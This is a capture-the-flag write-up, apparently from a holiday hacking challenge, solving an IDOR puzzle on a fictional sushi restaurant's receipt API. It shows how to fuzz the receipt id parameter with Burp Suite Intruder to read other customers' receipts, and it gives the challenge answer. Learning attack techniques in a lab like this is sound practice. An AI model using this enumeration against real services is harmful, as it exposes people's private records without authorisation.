# 🍣 IDORable Bistro – IDOR Vulnerability Write-Up

**Difficulty:** 2  
**Challenge Goal:**  
Exploit an **Insecure Direct Object Reference (IDOR)** vulnerability in a restaurant receipt system to uncover the **true name of a gnome** posing as a customer.

---

## 🧠 Scenario Summary

Josh suspects something is off at **Sasabune**, a restaurant using a QR-based receipt verification system.  
A strangely behaving customer ordered *frozen sushi*, which immediately raises red flags.

Based on prior experience with payment systems, this smells like a classic **IDOR vulnerability** — where object identifiers are exposed and can be manipulated to access unauthorized data.

Our mission:
- Inspect the receipt system
- Identify insecure direct object references
- Enumerate receipts
- Unmask the gnome’s identity

<img width="1072" height="225" alt="image" src="https://github.com/user-attachments/assets/ec43ae2a-348d-458a-906d-895a72c26bc5" />

---

## 🌐 Target Application

**Website:**  
```
https://its-idorable.holidayhackchallenge.com/
```

The homepage explains a QR-based receipt verification flow and includes a commented-out **test receipt link** in the HTML source:

```html
<!-- <a href="/receipt/a1b2c3d4">Sample Receipt</a> -->
```

This gives us our initial foothold.

---

## 🔍 Investigation Walkthrough

### Step 1: Access a Sample Receipt

Navigating to the test receipt URL:

```
https://its-idorable.holidayhackchallenge.com/receipt/a1b2c3d4
```

This page triggers a backend API request to retrieve receipt details.

---

### Step 2: Inspect Backend API Request

The frontend calls the following endpoint:

```
GET /api/receipt?id=101
```

The server responds with JSON data:

```json
{
  "customer": "Duke Dosis",
  "date": "2025-12-20",
  "id": 101,
  "items": [
    {"name": "Omakase Experience", "price": 150.0},
    {"name": "Sake Flight (Premium)", "price": 45.0}
  ],
  "note": "Claims his pet rock is a certified sushi-grade emotional support animal.",
  "paid": true,
  "table": 1,
  "total": 195.0
}
```

⚠️ No authentication or authorization checks are visible.

---

## 🧪 IDOR Exploitation

### Step 3: Enumerate Receipt IDs

Using **Burp Suite Intruder**, the `id` parameter was fuzzed from **100 to 200**:

```
GET /api/receipt?id=XXX
```

Each request returned valid receipt data, confirming an **IDOR vulnerability**.

---

### Step 4: Identify the Suspicious Receipt

One response stands out:

```
GET /api/receipt?id=139
```

Response:

```json
{
  "customer": "Bartholomew Quibblefrost",
  "date": "2025-12-20",
  "id": 139,
  "items": [
    {
      "name": "Frozen Roll (waitress improvised: sorbet, a hint of dry ice)",
      "price": 19.0
    }
  ],
  "note": "Insisted on increasingly bizarre rolls and demanded one be served frozen. He nodded solemnly and asked if we could make these in bulk.",
  "paid": true,
  "table": 14,
  "total": 19.0
}
```

This behavior matches the suspicious *gnome* described in the scenario.

---

## 🧩 Final Findings

### ✅ Name of the Gnome (Answer)
```
Bartholomew Quibblefrost
```

---

## 🏁 Conclusion

This challenge demonstrates a textbook **IDOR vulnerability**:

- Object IDs exposed directly to the client
- No access control on sensitive API endpoints
- Predictable numeric identifiers

By simply modifying a request parameter, we gained access to other customers’ receipts and successfully identified the gnome.

🍣 Vulnerability exploited — mystery solved!
